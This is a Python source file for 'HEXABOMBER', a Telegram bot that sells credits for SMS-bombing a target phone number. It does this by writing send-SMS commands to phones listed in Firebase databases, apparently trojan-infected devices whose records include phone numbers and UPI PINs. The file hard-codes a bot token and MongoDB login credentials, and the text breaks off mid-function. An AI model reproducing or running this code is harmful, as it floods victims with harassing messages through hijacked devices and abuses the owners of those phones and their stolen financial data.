#!/usr/bin/env python3
"""
HEXABOMBER Bot - MongoDB (FINAL)
Features: bold UI, plans, keys, force channel, maintenance, suspend,
QR, demo, support, broadcast, hidden 2x bonus, live progress, 10-digit validation.
"""

import asyncio
import json
import logging
import re
import random
import string
import sys
from datetime import datetime
from urllib.parse import urlparse
from uuid import uuid4

import httpx
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler, ConversationHandler,
    MessageHandler, filters, ContextTypes,
)
from apscheduler.schedulers.asyncio import AsyncIOScheduler
from apscheduler.triggers.date import DateTrigger
from pymongo import MongoClient
from pymongo.errors import DuplicateKeyError

# ============================================================
# CONFIG — YAHAN SAB KUCH SET KARO
# ============================================================
TOKEN = "8942365691:AAGFFipl3IXQ8n7kdBY8LlA8Z-zLqaXAmiU"
ADMIN_IDS = [8544308334]
MONGO_URI = "mongodb+srv://mailprimesatyam_db_user:6nSuJgdWhQqGwZId@customsmcluster.w8ptjnr.mongodb.net/?appName=Customsmcluster"
DB_NAME = "Customsmcluster"

MAX_CONCURRENT_REQUESTS = 100
DEFAULT_SUPPORT = "RAJU5029"

# ============================================================
# UNICODE BOLD
# ============================================================
def to_bold_font(text):
    res = []
    for c in str(text):
        if 'A' <= c <= 'Z':
            res.append(chr(0x1D5D4 + (ord(c) - ord('A'))))
        elif 'a' <= c <= 'z':
            res.append(chr(0x1D5EE + (ord(c) - ord('a'))))
        elif '0' <= c <= '9':
            res.append(chr(0x1D7EC + (ord(c) - ord('0'))))
        else:
            res.append(c)
    return ''.join(res)

def B(text):
    return to_bold_font(text)

# ============================================================
# LOGGING
# ============================================================
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

# ============================================================
# MONGO CONNECTION
# ============================================================
try:
    mongo_client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=10000)
    mongo_client.admin.command('ping')
    logger.info("MongoDB connected successfully")
except Exception as e:
    logger.error(f"MongoDB connection failed: {e}")
    print(f"\nMongoDB connection error: {e}")
    print("Check: 1) URI correct, 2) Network access 0.0.0.0/0 allowed, 3) Password correct")
    sys.exit(1)

db = mongo_client[DB_NAME]
users_col = db["users"]
jobs_col = db["jobs"]
firebases_col = db["firebases"]
keys_col = db["keys"]
redemptions_col = db["redemptions"]
plans_col = db["plans"]
settings_col = db["settings"]

users_col.create_index("user_id", unique=True)
plans_col.create_index("name", unique=True)
keys_col.create_index("key_string", unique=True)

def seed_default_plans():
    if plans_col.count_documents({}) == 0:
        plans_col.insert_many([
            {"name": "Starter", "price": 20, "credits": 50},
            {"name": "Basic", "price": 35, "credits": 100},
            {"name": "Premium", "price": 150, "credits": 600},
            {"name": "Ultimate", "price": 600, "credits": 999999},
        ])
        logger.info("Default plans seeded.")

seed_default_plans()

# ============================================================
# HTTP CLIENT
# ============================================================
_http_client = None
_http_semaphore = None

def get_http_client():
    global _http_client
    if _http_client is None or _http_client.is_closed:
        _http_client = httpx.AsyncClient(
            timeout=httpx.Timeout(15.0, connect=8.0),
            limits=httpx.Limits(max_connections=200, max_keepalive_connections=100),
        )
    return _http_client

def get_http_semaphore():
    global _http_semaphore
    if _http_semaphore is None:
        _http_semaphore = asyncio.Semaphore(MAX_CONCURRENT_REQUESTS)
    return _http_semaphore

# ============================================================
# SETTINGS
# ============================================================
def get_setting(key, default=None):
    doc = settings_col.find_one({"key": key})
    return doc["value"] if doc else default

def set_setting(key, value):
    settings_col.update_one({"key": key}, {"$set": {"value": value}}, upsert=True)

def del_setting(key):
    settings_col.delete_one({"key": key})

def get_force_channel():
    v = get_setting("force_channel", "")
    return v.replace("@", "").strip() if v else ""

def set_force_channel(ch):
    set_setting("force_channel", ch.replace("@", "").strip())

def remove_force_channel():
    del_setting("force_channel")

def get_maintenance():
    return get_setting("maintenance", "False") == "True"

def set_maintenance(v):
    set_setting("maintenance", "True" if v else "False")

def toggle_maintenance():
    cur = get_maintenance()
    set_maintenance(not cur)
    return not cur

def get_suspended_users():
    v = get_setting("suspended_users", "[]")
    try: return json.loads(v)
    except: return []

def save_suspended_users(lst):
    set_setting("suspended_users", json.dumps(lst))

def is_suspended(uid):
    return uid in get_suspended_users()

def suspend_user(uid):
    lst = get_suspended_users()
    if uid in lst: return False
    lst.append(uid); save_suspended_users(lst); return True

def unsuspend_user(uid):
    lst = get_suspended_users()
    if uid not in lst: return False
    lst.remove(uid); save_suspended_users(lst); return True

def get_qr_photo(): return get_setting("qr_photo", None)
def set_qr_photo(fid): set_setting("qr_photo", fid)
def remove_qr_photo(): del_setting("qr_photo")

def get_demo_video(): return get_setting("demo_video", None)
def set_demo_video(fid): set_setting("demo_video", fid)
def remove_demo_video(): del_setting("demo_video")

def get_support_username():
    v = get_setting("support_username", DEFAULT_SUPPORT)
    return v.replace("@", "").strip() if v else DEFAULT_SUPPORT

def set_support_username(u): set_setting("support_username", u.replace("@", "").strip())
def remove_support_username(): del_setting("support_username")

# ============================================================
# USERS
# ============================================================
def get_user_credits(uid):
    doc = users_col.find_one({"user_id": uid})
    if doc: return doc.get("credits", 0)
    users_col.insert_one({"user_id": uid, "credits": 0, "plan": "None"})
    return 0

def update_user_credits(uid, delta):
    users_col.update_one({"user_id": uid}, {"$inc": {"credits": delta}}, upsert=True)

def set_user_credits(uid, credits):
    users_col.update_one({"user_id": uid}, {"$set": {"credits": credits}}, upsert=True)

def get_user_plan(uid):
    doc = users_col.find_one({"user_id": uid})
    return doc.get("plan", "None") if doc else "None"

def set_user_plan(uid, plan):
    users_col.update_one({"user_id": uid}, {"$set": {"plan": plan}}, upsert=True)

def deduct_credits(uid, amount):
    doc = users_col.find_one({"user_id": uid})
    if not doc:
        users_col.insert_one({"user_id": uid, "credits": 0, "plan": "None"})
        return False
    if doc.get("credits", 0) >= amount:
        users_col.update_one({"user_id": uid}, {"$inc": {"credits": -amount}})
        return True
    return False

def get_all_user_ids():
    return [d["user_id"] for d in users_col.find({}, {"user_id": 1})]

# ============================================================
# PLANS
# ============================================================
def db_get_plans():
    return list(plans_col.find({}, {"name": 1, "price": 1, "credits": 1}))

def db_add_plan(name, price, credits):
    try:
        plans_col.insert_one({"name": name, "price": price, "credits": credits})
        return True, "Plan added."
    except DuplicateKeyError:
        return False, "Plan name already exists."
    except Exception as e:
        return False, f"Error: {e}"

def db_update_plan(old_name, new_name, price, credits):
    r = plans_col.update_one({"name": old_name}, {"$set": {"name": new_name, "price": price, "credits": credits}})
    if r.matched_count == 0: return False, "Plan not found."
    return True, "Plan updated."

def db_delete_plan(name):
    r = plans_col.delete_one({"name": name})
    if r.deleted_count == 0: return False, "Plan not found."
    return True, "Plan deleted."

# ============================================================
# KEYS
# ============================================================
def db_add_key(key_string, credits, max_uses, created_by):
    try:
        keys_col.insert_one({
            "key_string": key_string, "credits": credits,
            "max_uses": max_uses, "used_count": 0,
            "created_by": created_by,
            "created_at": datetime.now().isoformat()
        })
        return True, "Key added."
    except DuplicateKeyError:
        return False, "Key already exists."

def db_redeem_key(key_string, uid):
    doc = keys_col.find_one({"key_string": key_string})
    if not doc: return False
    if doc.get("used_count", 0) >= doc.get("max_uses", 0): return False
    if redemptions_col.find_one({"key_string": key_string, "user_id": uid}): return False
    keys_col.update_one({"key_string": key_string}, {"$inc": {"used_count": 1}})
    credits = doc["credits"]
    if credits >= 999999:
        set_user_credits(uid, 999999)
    else:
        update_user_credits(uid, credits)
    set_user_plan(uid, key_string)
    redemptions_col.insert_one({
        "key_string": key_string, "user_id": uid,
        "redeemed_at": datetime.now().isoformat()
    })
    return True

# ============================================================
# FIREBASES
# ============================================================
def db_get_firebases():
    return {d["id"]: {"url": d["url"], "secret": d.get("secret", "")} for d in firebases_col.find({})}

def db_add_firebase(fid, url, secret=""):
    firebases_col.update_one({"id": fid}, {"$set": {"url": url, "secret": secret}}, upsert=True)

def db_delete_firebase(fid):
    firebases_col.delete_one({"id": fid})

# ============================================================
# JOBS
# ============================================================
def db_add_job(job_id, target, message, firebase_ids, chat_id, total_sms, delay, user_id):
    jobs_col.insert_one({
        "id": job_id, "target": target, "message": message, "status": "pending",
        "firebase_ids": firebase_ids, "chat_id": chat_id,
        "total_sms": total_sms, "delay": delay, "user_id": user_id,
        "created_at": datetime.now().isoformat(),
    })

def db_update_job(job_id, **kwargs):
    jobs_col.update_one({"id": job_id}, {"$set": kwargs})

# ============================================================
# FIREBASE API
# ============================================================
async def firebase_request(url, method="GET", payload=None):
    raw = url.rstrip("/"); query = ""
    if "?" in raw:
        raw, query = raw.split("?", 1)
    if raw.endswith(".json"): raw = raw[:-5]
    raw = raw.rstrip("/")
    parsed = urlparse(raw)
    full_url = f"{raw}.json" if parsed.path else f"{raw}/.json"
    if query: full_url += f"?{query}"
    client = get_http_client()
    try:
        async with get_http_semaphore():
            if method == "GET": resp = await client.get(full_url)
            elif method == "PUT": resp = await client.put(full_url, json=payload)
            elif method == "POST": resp = await client.post(full_url, json=payload)
            elif method == "DELETE": resp = await client.delete(full_url)
            else: raise ValueError("Unsupported")
            resp.raise_for_status()
            try: return resp.json()
            except json.JSONDecodeError: return {"_raw": resp.text}
    except httpx.HTTPStatusError as e:
        s = e.response.status_code
        try: err = e.response.json()
        except: err = {"error": str(e)}
        return {"_error": True, "status": s, "message": err.get("error", str(e))}
    except httpx.ConnectError:
        return {"_error": True, "status": 0, "message": "Connection failed."}
    except httpx.TimeoutException:
        return {"_error": True, "status": 0, "message": "Timed out."}
    except Exception as e:
        return {"_error": True, "status": 0, "message": str(e)}

async def get_online_devices(url):
    base = url.rstrip("/")
    if base.endswith(".json"): base = base[:-5]
    base = base.rstrip("/")
    try:
        async with get_http_semaphore():
            resp = await get_http_client().get(f"{base}/clients.json")
            resp.raise_for_status()
            clients = resp.json()
    except Exception:
        return []
    if not isinstance(clients, dict): return []
    online = []
    for dev_id, info in clients.items():
        if info.get("status") is True:
            online.append({
                "id": dev_id, "name": info.get("modelName", dev_id),
                "phone": info.get("mobNo", "N/A"), "battery": info.get("battery", "N/A"),
                "provider": info.get("service_provider", ""),
                "sims": info.get("sims", []), "upipin": info.get("upipin", ""),
            })
    return online

async def send_sms_via_device(url, device_id, sim_index, target, message):
    payload = {"from": sim_index, "to": target, "message": message,
               "isSended": False, "timestamp": datetime.now().isoformat()}
    put_url = f"{url.rstrip('/')}/clients/{device_id}/webhookEvent/sendSms.json"
    try:
        async with get_http_semaphore():
            resp = await get_http_client().put(put_url, json=payload)
            resp.raise_for_status()
            try:
                data = resp.json()
                if isinstance(data, dict) and data.get("error"):
                    logger.error(f"Firebase error: {data}")
                    return False
            except Exception:
                pass
        return True
    except httpx.TimeoutException:
        logger.error(f"Timeout {device_id}")
        return False
    except Exception as e:
        logger.error(f"Send failed {device_id}: {e}")
        return False

# ============================================================
# GLOBALS
# ============================================================
running_jobs = {}
progress_messages = {}
pending_payments = {}
payment_store = {}
processed_payments = set()
BOT = None

def set_bot(bot):
    global BOT
    BOT = bot

LINE = B("━━━━━━━━━━━━━━━━━━━━━━━━━")

# ============================================================
# BOMB ENGINE
# ============================================================
async def execute_bomb_job(job_id, target, message, firebase_ids, total_sms, delay, user_id, schedule_time=None):
    if schedule_time and schedule_time > datetime.now():
        scheduler = AsyncIOScheduler()
        scheduler.add_job(execute_bomb_job, trigger=DateTrigger(run_date=schedule_time),
                          args=[job_id, target, message, firebase_ids, total_sms, delay, user_id, None],
                          id=job_id, replace_existing=True)
        scheduler.start()
        db_update_job(job_id, status="scheduled", scheduled_for=schedule_time.isoformat())
        return

    db_update_job(job_id, status="running", started_at=datetime.now().isoformat())
    actual_sms_to_send = total_sms * 2  # hidden 2x bonus

    if not deduct_credits(user_id, total_sms):
        db_update_job(job_id, status="failed", finished_at=datetime.now().isoformat(),
                      devices_used=0, success_count=0, fail_count=0, credit_used=0)
        await send_progress_update(job_id, 0, total=total_sms, success=0, fail=0,
                                    finished=True, error=B("Insufficient credits"))
        return

    all_devices = []
    firebases = db_get_firebases()
    for fid in [f for f in firebase_ids if f in firebases]:
        devices = await get_online_devices(firebases[fid]["url"])
        for dev in devices:
            all_devices.append((fid, dev, firebases[fid]["url"]))

    if not all_devices:
        update_user_credits(user_id, total_sms)
        db_update_job(job_id, status="failed", finished_at=datetime.now().isoformat(),
                      devices_used=0, success_count=0, fail_count=0, credit_used=0)
        await send_progress_update(job_id, 0, total=total_sms, success=0, fail=0,
                                    finished=True, error=B("No online devices"))
        return

    n = len(all_devices)
    per = actual_sms_to_send // n
    rem = actual_sms_to_send % n
    assignments = []
    for i, (fid, dev, url) in enumerate(all_devices):
        c = per + (1 if i < rem else 0)
        if c > 0: assignments.append((fid, dev, url, c))

    total_attempts = sum(c for _, _, _, c in assignments)
    success = 0; fail = 0
    await send_progress_update(job_id, 0, total=total_sms, success=0, fail=0)

    idx = 0
    for fid, dev, url, cnt in assignments:
        sims = dev.get("sims", [])
        sim_count = max(1, len(sims)) if sims else 1

        for i in range(cnt):
            sim_index = i % sim_count
            ok = await send_sms_via_device(url, dev["id"], sim_index, target, message)
            if ok: success += 1
            else: fail += 1
            idx += 1
            display_done = min(idx, total_sms)
            display_success = min(success, total_sms)
            await send_progress_update(job_id, display_done, total=total_sms,
                                        success=display_success, fail=fail)
            await asyncio.sleep(max(delay, 0.3))

    if fail > 0: update_user_credits(user_id, fail)

    display_success = min(success, total_sms)
    db_update_job(job_id, status="completed", finished_at=datetime.now().isoformat(),
                  devices_used=n, success_count=display_success,
                  fail_count=fail, credit_used=display_success)
    await send_progress_update(job_id, total_sms, total=total_sms,
                                success=display_success, fail=fail, finished=True)
    running_jobs.pop(job_id, None); progress_messages.pop(job_id, None)

async def send_progress_update(job_id, done, total, success, fail, finished=False, error=None):
    if BOT is None: return
    job = jobs_col.find_one({"id": job_id})
    if not job: return
    chat_id = job["chat_id"]; target = job["target"]; user_id = job.get("user_id")
    credits = get_user_credits(user_id) if user_id else 0
    percent = 0 if total == 0 else int((done / total) * 100)
    bar_len = 20
    filled = int(bar_len * percent / 100)
    bar = "▰" * filled + "▱" * (bar_len - filled)
    if error: status_text = f"❌ {B(error)}"
    elif finished: status_text = f"✅ {B('Completed')}"
    else: status_text = f"🔄 {B('Running')}"
    text = (
        f"{LINE}\n💣 {B('HEXABOMBER | Job')}: {job_id}\n{LINE}\n\n"
        f"{bar}  {B(str(percent))}%\n\n"
        f"📞 {B('Target')}: {B(target)}\n"
        f"✅ {B('Sent')}: {B(str(success))}   ❌ {B('Failed')}: {B(str(fail))}\n"
        f"💳 {B('Credits')}: {B(str(credits))}\n\n"
        f"📌 {B('Status')}: {status_text}"
    )
    if job_id in progress_messages:
        try:
            await BOT.edit_message_text(text, chat_id=chat_id, message_id=progress_messages[job_id])
        except: pass
    else:
        try:
            m = await BOT.send_message(chat_id, text)
            progress_messages[job_id] = m.message_id
        except: pass

# ============================================================
# STATES
# ============================================================
(TARGET, MESSAGE, SMS_COUNT, SPEED, SCHEDULE) = range(5)

USER_BUTTONS = [
    f"💣 {B('LAUNCH BOMB')}", f"🎬 {B('SEE DEMO')}",
    f"💳 {B('SUBSCRIPTION PLANS')}", f"👤 {B('MY ACCOUNT')}",
    f"✉️ {B('HELP & SUPPORT')}",
]
ADMIN_BUTTONS = [
    f"🔧 {B('ADMIN PANEL')}",
    f"🔑 {B('GENERATE KEY')}", f"➕ {B('ADD FIREBASE')}",
    f"⚙️ {B('MANAGE FIREBASES')}", f"📡 {B('ONLINE DEVICES')}",
    f"✉️ {B('MESSAGE USER')}", f"🔍 {B('CHECK USER')}",
    f"🚫 {B('SUSPEND')}", f"✅ {B('UNSUSPEND')}",
    f"🔗 {B('FORCE CHANNEL')}", f"❌ {B('REMOVE FORCE SUB')}",
    f"📊 {B('VAST STATS')}", f"🔧 {B('MAINTENANCE')}",
    f"✅ {B('REMOVE MAINTENANCE')}",
    f"🎬 {B('SET DEMO')}", f"❌ {B('REMOVE DEMO')}",
    f"🖼 {B('SET QR')}", f"❌ {B('REMOVE QR')}",
    f"➕ {B('ADD CREDIT')}", f"➖ {B('REMOVE CREDIT')}",
    f"✅ {B('ADD PLAN')}", f"📝 {B('EDIT PLAN')}", f"🗑 {B('DELETE PLAN')}",
    f"🆘 {B('ADD SUPPORT')}", f"❌ {B('REMOVE SUPPORT')}",
    f"📢 {B('BROADCAST')}", f"🗑 {B('CLEAR DB')}",
    f"⬅️ {B('BACK TO MAIN MENU')}",
]
ALL_BUTTONS = USER_BUTTONS + ADMIN_BUTTONS

def get_main_keyboard(uid):
    if uid in ADMIN_IDS:
        kb = [
            [f"💣 {B('LAUNCH BOMB')}", f"🎬 {B('SEE DEMO')}"],
            [f"💳 {B('SUBSCRIPTION PLANS')}"],
            [f"👤 {B('MY ACCOUNT')}", f"✉️ {B('HELP & SUPPORT')}"],
            [f"🔧 {B('ADMIN PANEL')}"],
        ]
    else:
        kb = [
            [f"💣 {B('LAUNCH BOMB')}", f"🎬 {B('SEE DEMO')}"],
            [f"💳 {B('SUBSCRIPTION PLANS')}"],
            [f"👤 {B('MY ACCOUNT')}", f"✉️ {B('HELP & SUPPORT')}"],
        ]
    return ReplyKeyboardMarkup(kb, resize_keyboard=True)

def get_admin_panel_keyboard():
    kb = [
        [f"🔑 {B('GENERATE KEY')}", f"➕ {B('ADD FIREBASE')}"],
        [f"⚙️ {B('MANAGE FIREBASES')}", f"📡 {B('ONLINE DEVICES')}"],
        [f"✉️ {B('MESSAGE USER')}", f"🔍 {B('CHECK USER')}"],
        [f"🚫 {B('SUSPEND')}", f"✅ {B('UNSUSPEND')}"],
        [f"🔗 {B('FORCE CHANNEL')}", f"❌ {B('REMOVE FORCE SUB')}"],
        [f"📊 {B('VAST STATS')}", f"🔧 {B('MAINTENANCE')}"],
        [f"✅ {B('REMOVE MAINTENANCE')}"],
        [f"🎬 {B('SET DEMO')}", f"❌ {B('REMOVE DEMO')}"],
        [f"🖼 {B('SET QR')}", f"❌ {B('REMOVE QR')}"],
        [f"➕ {B('ADD CREDIT')}", f"➖ {B('REMOVE CREDIT')}"],
        [f"✅ {B('ADD PLAN')}", f"📝 {B('EDIT PLAN')}", f"🗑 {B('DELETE PLAN')}"],
        [f"🆘 {B('ADD SUPPORT')}", f"❌ {B('REMOVE SUPPORT')}"],
        [f"📢 {B('BROADCAST')}"],
        [f"🗑 {B('CLEAR DB')}"],
        [f"⬅️ {B('BACK TO MAIN MENU')}"],
    ]
    return ReplyKeyboardMarkup(kb, resize_keyboard=True)

def convert_broadcast_text(text):
    if not text: return text
    pattern = re.compile(r'(https?://\S+|t\.me/\S+|@\w+)')
    result = []; last = 0
    for m in pattern.finditer(text):
        if m.start() > last:
            result.append(to_bold_font(text[last:m.start()]))
        result.append(m.group(0))
        last = m.end()
    if last < len(text):
        result.append(to_bold_font(text[last:]))
    return "".join(result)

async def check_channel_membership(uid, bot):
    ch = get_force_channel()
    if not ch: return (True, [])
    missing = []
    try:
        m = await bot.get_chat_member(f"@{ch}", uid)
        if m.status in ["left", "kicked"]: missing.append(f"@{ch}")
    except: missing.append(f"@{ch}")
    return (len(missing) == 0, missing)

def get_join_keyboard():
    ch = get_force_channel()
    btns = []
    if ch: btns.append([InlineKeyboardButton(f"🔗 {B('Join Channel')}", url=f"https://t.me/{ch}")])
    btns.append([InlineKeyboardButton(f"🔄 {B('Try Again')}", callback_data="check_join")])
    return InlineKeyboardMarkup(btns)

# ============================================================
# START
# ============================================================
async def ping(update, context):
    await update.message.reply_text(f"🏓 {B('Pong!')}")

async def start(update, context):
    uid = update.effective_user.id
    get_user_credits(uid)
    if get_maintenance() and uid not in ADMIN_IDS:
        await update.message.reply_text(f"🛠 {B('UNDER MAINTENANCE')}\n{LINE}\n{B('Please try again later.')}")
        return
    if uid not in ADMIN_IDS and is_suspended(uid):
        await update.message.reply_text(f"🚫 {B('YOU ARE SUSPENDED')}\n{B('Contact owner.')}")
        return
    joined, _ = await check_channel_membership(uid, context.bot)
    if not joined:
        await update.message.reply_text(f"▶ {B('Join channel first, then click Try Again')} 🔽",
                                         reply_markup=get_join_keyboard())
        return
    credits = get_user_credits(uid)
    is_admin = uid in ADMIN_IDS
    role = f"👑 {B('ADMIN')}" if is_admin else f"⚡ {B('USER')}"
    text = (
        f"╔══════════════════════════════════╗\n"
        f"     🔥 {B('HEXABOMBER')} 🔥\n"
        f"╚══════════════════════════════════╝\n\n"
        f"👤 {B('User ID')}: {B(str(uid))}\n"
        f"💎 {B('Credits')}: {B(str(credits))}\n"
        f"🎖️ {B('Role')}: {role}\n\n"
        f"{LINE}\n"
        f"🚀 {B('Server')}: {B('Ultra-Fast Async')}\n"
        f"⚡ {B('Multi-User')}: {B('Unlimited')}\n"
        f"🛡️ {B('Status')}: ✅ {B('Online')}\n"
        f"{LINE}\n\n"
        f"👇 {B('Use the buttons below to navigate')} ✨"
    )
    await update.message.reply_text(text, reply_markup=get_main_keyboard(uid))

# ============================================================
# SUBSCRIPTION PLANS
# ============================================================
async def show_subscription_plans(update, context):
    plans = db_get_plans()
    if not plans:
        await update.message.reply_text(f"❌ {B('No plans available.')}")
        return
    TAG = {"starter": f"⚡ {B('Perfect for testing')}", "basic": f"🚀 {B('More power')}",
           "premium": f"⚡ {B('High performance')}", "ultimate": f"🚀 {B('Full access • No limits')}"}
    ICO = {"starter": "💠", "basic": "💎", "premium": "🔥", "ultimate": "👑"}
    text = f"💎 {B('BOT PLANS')} 📡✨\n\n"
    for p in plans:
        nk = p["name"].lower()
        icon = ICO.get(nk, "💎")
        tag = TAG.get(nk, f"✨ {B('Great choice!')}")
        if p["credits"] >= 999999:
            text += (f"{LINE}\n\n{icon} {B(p['name'].upper())} {B('PLAN')}\n"
                     f"💰 {B(str(p['price']))}₹\n"
                     f"⏳ {B('1 MONTH VALIDITY')}\n"
                     f"♾️ {B('UNLIMITED')} {B('CREDITS')}\n{tag}\n\n")
        else:
            text += (f"{LINE}\n\n{icon} {B(p['name'].upper())} {B('PLAN')}\n"
                     f"💰 {B(str(p['price']))}₹\n"
                     f"🔍 {B(str(p['credits']))} {B('CREDITS')}\n{tag}\n\n")
    text += f"{LINE}\n\n{B('Choose a plan below to pay')}:"
    btns = [InlineKeyboardButton(f"💎 {B(p['name'])} - ₹{p['price']}", callback_data=f"plan_{i}")
            for i, p in enumerate(plans)]
    rows = [btns[i:i+2] for i in range(0, len(btns), 2)]
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(rows))

# ============================================================
# MY ACCOUNT
# ============================================================
async def show_my_account(update, context):
    user = update.effective_user
    uid = user.id
    credits = get_user_credits(uid)
    plan_name = get_user_plan(uid)
    plan_display = B(plan_name) if plan_name and plan_name != "None" else B("None")
    name = user.first_name or "N/A"
    if user.last_name: name += f" {user.last_name}"
    username_display = f"@{user.username}" if user.username else B("None")
    is_admin = uid in ADMIN_IDS
    role_icon = "👑" if is_admin else "⚡"
    text = (
        f"{LINE}\n👤 {B('MY ACCOUNT')}\n{LINE}\n\n"
        f"• {B('NAME')}: {B(name)}\n"
        f"• {B('USERNAME')}: {B(username_display)}\n"
        f"• {B('USER ID')}: {B(str(uid))}\n"
        f"• {B('ROLE')}: {role_icon} {B('ADMIN') if is_admin else B('USER')}\n"
        f"• {B('PLAN')}: {plan_display}\n\n"
        f"📊 {B('CREDIT')}: {B(str(credits))}\n{LINE}"
    )
    support = get_support_username()
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton(f"💳 {B('Buy Credits')}", callback_data="show_plans")],
        [InlineKeyboardButton(f"💬 {B('Contact Support')}", url=f"https://t.me/{support}")],
    ])
    await update.message.reply_text(text, reply_markup=kb)

# ============================================================
# VAST STATS
# ============================================================
async def show_vast_stats(update, context):
    total_users = users_col.count_documents({})
    admin_count = len(ADMIN_IDS)
    total_jobs = jobs_col.count_documents({})
    agg = list(jobs_col.aggregate([{"$group": {"_id": None, "s": {"$sum": "$success_count"}, "f": {"$sum": "$fail_count"}}}]))
    total_sent = agg[0]["s"] if agg and agg[0].get("s") else 0
    total_fail = agg[0]["f"] if agg and agg[0].get("f") else 0
    total_fbs = firebases_col.count_documents({})
    total_keys = keys_col.count_documents({})
    cred_agg = list(users_col.aggregate([{"$group": {"_id": None, "t": {"$sum": "$credits"}}}]))
    total_credits = cred_agg[0]["t"] if cred_agg and cred_agg[0].get("t") else 0
    suspended_count = len(get_suspended_users())
    force_ch = get_force_channel()
    force_display = f"@{force_ch}" if force_ch else B("OFF")
    try:
        db_stats = db.command("dbstats")
        db_size = db_stats.get("dataSize", 0) / (1024 * 1024)
        db_objects = db_stats.get("objects", 0)
    except: db_size = 0; db_objects = 0
    text = (
        f"📊 {B('VAST STATS')}\n{LINE}\n\n"
        f"👥 {B('Users')}: {B(str(total_users))}\n"
        f"🚫 {B('Suspended')}: {B(str(suspended_count))}\n"
        f"👑 {B('Admins')}: {B(str(admin_count))}\n"
        f"💰 {B('Revenue')}: ₹{B('0')}\n"
        f"🛠 {B('Maintenance')}: {B('ON') if get_maintenance() else B('OFF')}\n"
        f"🔗 {B('Force Sub')}: {force_display}\n\n"
        f"{LINE}\n📨 {B('BOMBING')}\n"
        f"📦 {B('Total Jobs')}: {B(str(total_jobs))}\n"
        f"✅ {B('SMS Sent')}: {B(str(total_sent))}\n"
        f"❌ {B('SMS Failed')}: {B(str(total_fail))}\n\n"
        f"{LINE}\n🗄 {B('DATABASE')}\n"
        f"• {B('Firebases')}: {B(str(total_fbs))}\n"
        f"• {B('Keys')}: {B(str(total_keys))}\n"
        f"• {B('Credits in Circulation')}: {B(str(total_credits))}\n"
        f"• {B('Documents')}: {B(str(db_objects))}\n"
        f"• {B('Size')}: {B(f'{db_size:.2f} MB')}\n{LINE}"
    )
    await update.message.reply_text(text, reply_markup=get_admin_panel_keyboard())

# ============================================================
# ONLINE DEVICES (COUNT ONLY)
# ============================================================
async def show_devices_from_message(update):
    firebases = db_get_firebases()
    if not firebases:
        await update.message.reply_text(f"{B('No Firebase configured.')}")
        return
    loading = await update.message.reply_text(f"⏳ {B('Loading devices...')}")
    text = f"📡 {B('ONLINE DEVICES')}\n{LINE}\n\n"
    total = 0
    for fid, data in firebases.items():
        try:
            devices = await get_online_devices(data["url"])
            count = len(devices)
            total += count
            icon = "🟢" if count > 0 else "🔴"
            text += f"{icon} {B('FB')} {B(fid)}: {B(str(count))} {B('online devices')}\n"
        except Exception:
            text += f"🔴 {B('FB')} {B(fid)}: {B('Error')}\n"
    text += f"\n{LINE}\n📊 {B('Total')}: {B(str(total))} {B('devices online')}"
    try:
        await loading.edit_text(text)
    except Exception:
        await update.message.reply_text(text)

# ============================================================
# BOMB WIZARD
# ============================================================
async def bomb_wizard_start(update, context):
    uid = update.effective_user.id
    if get_maintenance() and uid not in ADMIN_IDS:
        msg = f"🛠 {B('UNDER MAINTENANCE')}"
        if update.callback_query: await update.callback_query.message.reply_text(msg)
        else: await update.message.reply_text(msg)
        return ConversationHandler.END
    if uid not in ADMIN_IDS and is_suspended(uid):
        msg = f"🚫 {B('YOU ARE SUSPENDED')}"
        if update.callback_query: await update.callback_query.message.reply_text(msg)
        else: await update.message.reply_text(msg)
        return ConversationHandler.END
    if uid not in ADMIN_IDS:
        joined, _ = await check_channel_membership(uid, context.bot)
        if not joined:
            msg = f"⚠️ {B('Join channel first!')}"
            if update.callback_query: await update.callback_query.message.reply_text(msg, reply_markup=get_join_keyboard())
            else: await update.message.reply_text(msg, reply_markup=get_join_keyboard())
            return ConversationHandler.END

    # SUBSCRIPTION CHECK
    if uid not in ADMIN_IDS:
        credits = get_user_credits(uid)
        plan = get_user_plan(uid)
        if credits <= 0 or plan == "None" or not plan:
            plans = db_get_plans()
            if not plans:
                msg = f"❌ {B('No plans available.')}"
                if update.callback_query: await update.callback_query.message.reply_text(msg)
                else: await update.message.reply_text(msg)
                return ConversationHandler.END
            TAG = {"starter": f"⚡ {B('Perfect for testing')}", "basic": f"🚀 {B('More power')}",
                   "premium": f"⚡ {B('High performance')}", "ultimate": f"🚀 {B('Full access • No limits')}"}
            ICO = {"starter": "💠", "basic": "💎", "premium": "🔥", "ultimate": "👑"}
            text = (f"⚠️ {B('NO ACTIVE SUBSCRIPTION')}\n{LINE}\n"
                    f"{B('You need a subscription to launch bombs.')}\n"
                    f"{B('Choose a plan below to buy')}:\n\n"
                    f"💎 {B('BOT PLANS')} 📡✨\n\n")
            for p in plans:
                nk = p["name"].lower(); icon = ICO.get(nk, "💎"); tag = TAG.get(nk, f"✨ {B('Great choice!')}")
                if p["credits"] >= 999999:
                    text += (f"{LINE}\n\n{icon} {B(p['name'].upper())} {B('PLAN')}\n"
                             f"💰 {B(str(p['price']))}₹\n⏳ {B('1 MONTH VALIDITY')}\n"
                             f"♾️ {B('UNLIMITED')} {B('CREDITS')}\n{tag}\n\n")
                else:
                    text += (f"{LINE}\n\n{icon} {B(p['name'].upper())} {B('PLAN')}\n"
                             f"💰 {B(str(p['price']))}₹\n🔍 {B(str(p['credits']))} {B('CREDITS')}\n{tag}\n\n")
            text += f"{LINE}\n\n{B('Choose a plan below to pay')}:"
            btns = [InlineKeyboardButton(f"💎 {B(p['name'])} - ₹{p['price']}", callback_data=f"plan_{i}")
                    for i, p in enumerate(plans)]
            rows = [btns[i:i+2] for i in range(0, len(btns), 2)]
            kb = InlineKeyboardMarkup(rows)
            if update.callback_query:
                await update.callback_query.answer()
                await update.callback_query.message.reply_text(text, reply_markup=kb)
            else:
                await update.message.reply_text(text, reply_markup=kb)
            return ConversationHandler.END

    prompt = (f"💣 {B('LAUNCH BOMB')}\n{LINE}\n"
              f"📞 {B('Please enter the target phone number')}\n"
              f"   {B('e.g. 9876543210')}\n\n"
